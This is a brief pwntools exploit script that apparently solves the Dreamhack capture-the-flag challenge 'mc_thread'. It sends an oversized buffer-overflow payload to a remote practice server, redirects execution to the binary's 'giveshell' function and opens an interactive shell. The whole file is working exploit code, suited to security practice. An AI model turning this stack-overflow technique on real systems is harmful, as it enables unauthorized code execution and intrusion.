#!/usr/bin/python3 
from pwn import * 

context.log_level = "debug"
context.arch = "amd64"
context.binary = elf = ELF('./mc_thread')

writeable = 0x404000
# p = process('./mc_thread')
p = remote('host1.dreamhack.games', 11820)
payload = p64(writeable) * (0x108 // 8) + b'\x00' * 8 
payload += p64(writeable) + p64(elf.symbols["giveshell"])
payload = payload + ((2344 - len(payload)) // 8) * p64(writeable)
payload += b'\x00' * 8
# Exploit 
p.sendlineafter(b'Size: ', str(len(payload)))
p.sendafter(b'Data: ', payload)
p.interactive()
